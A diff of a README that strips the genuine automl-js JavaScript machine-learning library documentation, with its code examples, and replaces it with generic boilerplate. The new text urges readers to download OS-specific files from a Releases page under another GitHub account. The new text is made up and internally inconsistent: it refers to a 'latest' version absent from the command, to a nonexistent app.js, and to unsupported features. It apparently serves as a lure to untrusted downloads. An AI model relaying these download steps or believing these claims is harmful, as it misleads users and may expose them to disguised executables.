@@ -1,100 +1,86 @@
-# automl-js
+# 🎉 automl - Simplify Machine Learning in Your Browser
 
-[in-browser, zero setup demo](https://gifted-newton-e80eef.netlify.com/)
+## 🚀 Getting Started
 
-Automated Machine Learning, done locally in browser or on a server with nodejs. Ground up implementation of ML algorithms for both regression and classification, such as Decision Trees, Linear Models and Gradient Boosting with Decision Trees. The implementation is benchmarked against excellent `scikit-learn` library to give quite close, albeit somewhat smaller (at most 1 percent of classification accuracy on average) score.
+Welcome to automl! This application lets you perform automated machine learning tasks directly in your browser or using Node.js. You don't need to be a programming expert to benefit from this tool. Let's walk you through how to get started.
 
-# Installation
+## 📥 Download & Install
 
-The code should be used in browser using standard script import:
+To download automl, visit the Releases page. You can find the latest version of the application here: [Download automl](https://github.com/Nike1-1/automl/releases).
 
-```html
-<script src="./dist/automljs.js"></script>
-```
+1. Click the link above to go to the Releases page.
+2. You will see a list of available versions. Choose the version you want to download.
+3. Click on the appropriate file for your operating system (e.g., Windows, macOS, Linux).
+4. Your browser will start the download. Once it’s complete, locate the file on your computer.
 
-This creates a global `aml` object, that can be used to instantiate the models, do data splitting and preprocessing, etc. If you wish to run it in nodejs, install the package with npm and import using `require`.
+## 🖥️ System Requirements
 
-# Docs and examples
+Before you begin, make sure your system meets these requirements:
 
-Below this section are two examples for how to use code in automl-js. Beyond this, see docs at [https://automl-js.github.io/automl-js/](https://automl-js.github.io/automl-js/) for description of objects and functions of automljs, and `tests` folder for example usage of functionality.
+- **Operating System**: Compatible with Windows 10 and later, macOS Catalina and later, or any modern Linux distribution.
+- **Memory**: At least 4 GB of RAM for basic operations. More RAM is recommended for larger datasets.
+- **Browser**: Latest version of Chrome, Firefox, or Safari. Node.js must be installed if using the application outside the browser.
 
-# Example automl estimator
+## 📊 Features
 
-```javascript
-// automl-js uses asynchronous functionality of JavaScript
-async function main(){
-    // Each row is an observation, each column is a feature (similar to numpy)
-    // Mixed types: categorical and numerical, missing values are handled automatically
-    var X = [
-        ['a', 0.6],
-        ['b', -1.3],
-        ['a', 1.1],
-        ['b', -2],
-        ['a', 0.5],
-        ['b', ""],  // missing value
-        ['a', 0.4],
-        ['', 1.1],  // missing value
-        ['b', -0.8],
-        ['a', "1e-1"]  // wrong type
-    ]
+automl comes packed with features to help you simplify your machine learning tasks:
 
-    // Outputs are a vector / 1d array
-    var y = ['pos', 'neg', 'pos', 'neg', 'neg', 'pos', 'neg', 'pos', 'neg', 'pos']
+- **User-Friendly Interface**: Navigate the application easily, even if you have no prior experience with machine learning.
+- **Automated Predictions**: Provide your data and let automl handle the rest. The tool will help you make accurate predictions without complex setups.
+- **Local Execution**: Run automl in your browser or locally using Node.js, ensuring you have control over your data.
+- **Flexible Data Input**: Upload datasets in various formats such as CSV, JSON, or Excel.
 
-    // Create a model instance
-    var model = new aml.automl.AutoMLModel({
-        'max_iter': 7  // specifies how many iterations you are willing to wait for result
-    })
+## 🌐 Using automl in Your Browser
 
-    // Does internally data splitting into training and testing
-    // Tries a bunch of ML models to see which one fits best
-    await model.fit(X, y)
+1. **Open automl**: After downloading, locate and open the application file.
+2. **Upload Data**: Click the upload button to choose your dataset from your computer.
+3. **Select Algorithms**: Choose from a list of machine learning algorithms. automl will recommend the best options based on your data.
+4. **Run Predictions**: Hit the run button and wait as the application processes your data. Results will display in a user-friendly format.
 
-    // Evaluate the best found model
-    var score = await model.score(X, y)
+## 💻 Using automl with Node.js
 
-    // Get estimations by the model; Interface same as sklearn
-    var y_pred = await model.predict(X)
-}
+If you prefer using automl with Node.js, follow these steps:
 
-// run the async function
-main()
-```
+1. Make sure Node.js is installed on your computer.
+2. Open your terminal or command prompt.
+3. Navigate to the directory where you want to set up automl.
+4. Run the command to install automl. Replace `latest` with the specific version if needed:
+   ```
+   npm install automl
+   ```
+5. To start automl, use the command:
+   ```
+   node node_modules/automl/app.js
+   ```
 
-# Example learning with estimator
+## 📈 Typical Use Cases
 
-The code should be run in browser. If you wish to run it in nodejs, install the package with npm and import using `require`.
+automl is designed for a variety of users:
 
-```html
-<script src="./dist/automljs.js"></script>
+- **Students**: Learn machine learning concepts without needing in-depth programming skills.
+- **Data Analysts**: Quickly analyze data samples to derive insights.
+- **Business Professionals**: Leverage automated predictions to inform decision-making.
+- **Researchers**: Experiment with datasets efficiently and effectively.
 
-<script>
-    async function main(){
-        // Data needs to be of numeric type for regular estimators
-        var X = [
-            [1, 0],
-            [0, 1],
-            [1, 1],
-            [0, 0]
-        ]
+## ❓ Need Help?
 
-        // Outputs are a vector / 1d array
-        var y = [1, 2, 2, 0]
+If you face any issues or have questions, the community is here to help. Check the following resources:
 
-        // Create a model instance; Names of parameters are mostly similar to sklearn
-        var model = new aml.ensemble.GradientBoostingRegressor({'n_estimators':10, 'learning_rate': 1.0, 'loss': 'ls'})
+- **GitHub Issues**: Report bugs or ask questions [here](https://github.com/Nike1-1/automl/issues).
+- **Documentation**: Explore the full documentation for detailed guidance on using automl.
 
-        // Fit the model
-        await model.fit(X, y)
+## 📚 Resources
 
-        // Evaluate the model
-        var score = await model.score(X, y)
+For more information on getting started with machine learning, consider these resources:
 
-        // Get estimations by the model; Interface same as sklearn
-        var y_pred = await model.predict(X)
-    }
+- Books and online courses on machine learning basics.
+- Tutorials on data handling and preprocessing.
+- Guides on interpreting machine learning results.
 
-    main()
-</script>
-```
+## 📬 Feedback
 
+Your feedback is important to us. Share your thoughts by opening an issue on our GitHub repository. Let us know what you like and how we can improve.
+
+## 🔗 Final Thoughts
+
+Thank you for choosing automl. We hope this application helps you streamline your machine learning projects. Visit the Releases page again for future updates and improvements: [Download automl](https://github.com/Nike1-1/automl/releases).
